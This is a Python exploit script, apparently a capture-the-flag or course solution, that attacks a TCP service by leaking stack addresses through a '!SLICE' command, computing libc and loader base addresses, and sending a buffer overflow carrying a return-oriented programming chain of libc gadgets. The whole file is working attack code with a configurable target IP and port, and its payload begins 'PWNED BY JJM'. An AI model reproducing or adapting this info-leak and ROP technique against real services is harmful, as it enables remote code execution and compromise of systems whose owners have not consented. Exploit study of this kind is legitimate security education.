import socket
import struct

srv_ADDR = '127.0.0.1' # change to target IP
srv_PORT = int(7777) # change to target port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((srv_ADDR, srv_PORT))


def convert(start_address, offset):
    rop_address = int(start_address, 16) + offset # convert to ints to add hexadecimal values
    return struct.pack('<I', rop_address) # convert to bytes in little endian format

if __name__ == "__main__":
    # Expect to get 'READY\n' from the server
    data = s.recv(32)
    print(data) # READY\n

    # ------------- Info leak for base pointer ------------- #
    bytestream = bytes(b'!SLICE 60 64\n'); # does the info leak
    s.sendall(bytestream)

    bytestream = bytes(b'\x00\x00\x00\x00')
    s.sendall(bytestream)
    base_pointer = s.recv(32) # retrieve return address

    bp_hex = ""

    for i in base_pointer:
        temp = hex(i)[2:4]
        bp_hex = temp + bp_hex


    # ------------- Info leak for return address ------------- #
    bytestream = bytes(b'!SLICE 64 68\n'); # does the info leak
    s.sendall(bytestream)

    bytestream = bytes(b'\x00\x00\x00\x00')
    s.sendall(bytestream)
    returnAddress = s.recv(32) # retrieve return address

    return_hex = ""

    for i in returnAddress:

        temp = hex(i)[2:4]

        return_hex = temp + return_hex


    # ------------- Info leak for mode address ------------- #

    bytestream = bytes(b'!SLICE 72 76\n'); # does the info leak
    s.sendall(bytestream)

    bytestream = bytes(b'\x00\x00\x00\x00')
    s.sendall(bytestream)
    mode = s.recv(32) # retrieve mode address

    hex_values = ""

    for i in mode:

        temp = hex(i)[2:4]

        hex_values = temp + hex_values


    start_of_buffer = hex(int(hex_values, 16) - 84)
    start_of_libc = hex(int(start_of_buffer, 16) + 3396)
    start_of_ld = hex(int(start_of_buffer, 16) + 2088260)

    #print(hex_values)

    output = bytes(b'PWNED BY JJM\x0aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBB')

    output = b''.join([output, convert(bp_hex, 0)])


    # offset for rop gadget 1
    # 0x00138c79 : inc eax ; pop esp ; ret
    output = b''.join([output, convert(start_of_libc, 1281145)])
    output = b''.join([output, convert(hex_values, 4)])

    #preserve the mode
    output = b''.join([output, convert(hex_values, 0)])

    output = b''.join([output, bytes(b'DDDDDDDD')])
    #save the mode
    output = b''.join([output, bytes(b'\x00\x00\x00\x00')])


    # offset for rop gadget 2
    # 0x0002bfdb : pop eax ; ret
    output = b''.join([output, convert(start_of_libc, 180187)])
    output = b''.join([output, bytes(b'\x04\x00\x00\x00')])


    # offset for rop gadget 3
    # 0x00089556 : pop edx ; pop ebx ; pop esi ; ret
    output = b''.join([output, convert(start_of_libc, 562518)])
    output = b''.join([output, bytes(b'\x0d\x00\x00\x00')])
    output = b''.join([output, bytes(b'\x01\x00\x00\x00')])
    output = b''.join([output, bytes(b'EEEE')])


    # offset for rop gadget 4
    # 0x0003f4d7 : pop ecx ; ret
    output = b''.join([output, convert(start_of_libc, 259287)])
    output = b''.join([output, convert(start_of_buffer, 0)]) #give ecx a value


    #gadget 5
    #f7fcb090 - some kind of gadget - offset = 2089104 reference - 1FE090
    output = b''.join([output, convert(start_of_ld, 4240)])


    # offset for rop gadget 6
    # 0x00021986 : pop ebx ; ret
    output = b''.join([output, convert(start_of_libc, 137606)])
    output = b''.join([output, convert(start_of_libc, -2709995520)]) #\x00\x90\x55\x56 - off set of this from libc base

    #output = b''.join([output, bytes(b'\x00\x90\x55\x56')])

    # gadget 7 - the jump in the objdump of PI - this is no longer needed
    #output = b''.join([output, convert(hex_values, -2710001005)])
    #jumpInDump = bytes(b'\xa3\x6d\x55\x56')
    #output = b''.join([output, jumpInDump])


    #this moves the stack pointer - mode was orignally 5 bytes too long
    output = b''.join([output, convert(return_hex, -5)])



    #print(output)
    
    #print(output)

    bytestream = bytes(output)
    s.sendall(bytestream)
    data = s.recv(1024)

    #print(data)
    #print(output)

    print("CLOSE")
    s.close()



    #rop chain static addresses for working out offsets of relative addresses- x60\x60\x55\x56\x60\x60\x55\x56\x38\xc3\xdc\xf7\x79\x5c\xf0\xf7\x14\xc3\xdc\xf7\x10\xc3\xdc\xf7EEEEEEEE\x00\x00\x00\x00\xdb\x8f\xdf\xf7\x04\x00\x00\x00\x56\x65\xe5\xf7\x0d\x00\x00\x00\x01\x00\x00\x00\xc0\xca\xdc\xf7\xd7\xc4\xe0\xf7\xbc\xc2\xdc\xf7\x90\xb0\xfc\xf7\x86\xe9\xde\xf7\x00\x90\x55\x56\xa3\x6d\x55\x56
